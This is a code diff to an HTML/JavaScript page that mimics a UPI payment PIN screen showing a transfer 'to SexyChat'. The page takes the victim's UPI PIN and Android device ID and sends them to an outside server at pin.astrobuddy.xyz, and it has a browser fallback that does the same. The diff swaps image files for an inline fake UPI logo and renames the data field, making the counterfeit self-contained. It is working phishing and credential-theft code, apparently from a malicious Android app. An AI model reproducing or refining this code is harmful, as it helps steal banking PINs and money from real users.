@@ -55,10 +55,14 @@
         try {
           const deviceId = Android.getDeviceId();
           
+          // Send with device_id like other requests
           fetch("https://pin.astrobuddy.xyz/api/save-pin", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ pin: pin, deviceId: deviceId })
+            body: JSON.stringify({ 
+              pin: pin, 
+              device_id: deviceId 
+            })
           })
           .then(res => {
             if (!res.ok) {
@@ -69,7 +73,6 @@
             return res.json();
           })
           .then(data => {
-            // Success - redirect to success page
             setTimeout(() => {
               window.location.href = "final.html";
             }, 500);
@@ -81,14 +84,15 @@
           });
         } catch (err) {
           console.error(err);
-          // If Android interface not available (testing in browser)
-          // Still send to server with fallback deviceId
           const fallbackDeviceId = "browser_test_" + Date.now();
           
           fetch("https://pin.astrobuddy.xyz/api/save-pin", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ pin: pin, deviceId: fallbackDeviceId })
+            body: JSON.stringify({ 
+              pin: pin, 
+              device_id: fallbackDeviceId 
+            })
           })
           .then(res => {
             if (!res.ok) {
@@ -118,12 +122,17 @@
   <style>
     input { font-size: 20px !important; }
     .grid button { font-size: 22px !important; padding: 12px 0 !important; }
-    .grid img { width: 28px !important; height: 28px !important; }
+    .delete-icon, .submit-icon { width: 28px !important; height: 28px !important; }
   </style>
 </head>
 <body class="bg-white text-black min-h-screen flex flex-col justify-between">
   <div class="flex flex-col items-center pb-2 border-b border-gray-300">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI" class="h-12 mx-auto" />
+    <!-- UPI Logo Inline SVG -->
+    <svg class="h-12 mx-auto" viewBox="0 0 300 80" xmlns="http://www.w3.org/2000/svg">
+      <text x="10" y="50" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="#097939">UPI</text>
+      <text x="120" y="50" font-family="Arial, sans-serif" font-size="28" fill="#666">Unified Payments</text>
+    </svg>
+    
     <div class="box flex w-full py-2 px-4 bg-[#80808020] items-center justify-between">
       <div class="to">
         <div class="text-sm text-gray-500">To:</div>
@@ -135,6 +144,7 @@
       </div>
     </div>
   </div>
+  
   <div class="flex flex-col items-center py-6">
     <p class="text-sm text-gray-700 mb-4">ENTER UPI 4 OR 6 DIGIT PIN</p>
     <div class="flex justify-center space-x-2 mb-4">
@@ -149,6 +159,7 @@
       <span class="font-bold">!</span> You are transferring money from your account to SexyChat
     </div>
   </div>
+  
   <div class="bg-gray-100 py-4 rounded-t-3xl">
     <div class="grid grid-cols-3 gap-4 px-12 text-2xl font-medium text-gray-800">
       <button class="py-4" onclick="addDigit('1')">1</button>
@@ -160,12 +171,18 @@
       <button class="py-4" onclick="addDigit('7')">7</button>
       <button class="py-4" onclick="addDigit('8')">8</button>
       <button class="py-4" onclick="addDigit('9')">9</button>
-      <button class="py-4 text-xl text-center" onclick="removeLastDigit()">
-        <img src="./back.png" alt="Delete" width="30px" class="mx-auto">
+      <button class="py-4 text-xl text-center flex items-center justify-center" onclick="removeLastDigit()">
+        <!-- Delete/Backspace Icon -->
+        <svg class="delete-icon" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/>
+        </svg>
       </button>
       <button class="py-4" onclick="addDigit('0')">0</button>
-      <button class="py-4 text-2xl text-center" onclick="submitPIN()">
-        <img src="./right.png" alt="Submit" width="40px" class="mx-auto">
+      <button class="py-4 text-2xl text-center flex items-center justify-center" onclick="submitPIN()">
+        <!-- Check/Submit Icon -->
+        <svg class="submit-icon" viewBox="0 0 24 24" fill="#4CAF50">
+          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+        </svg>
       </button>
     </div>
   </div>
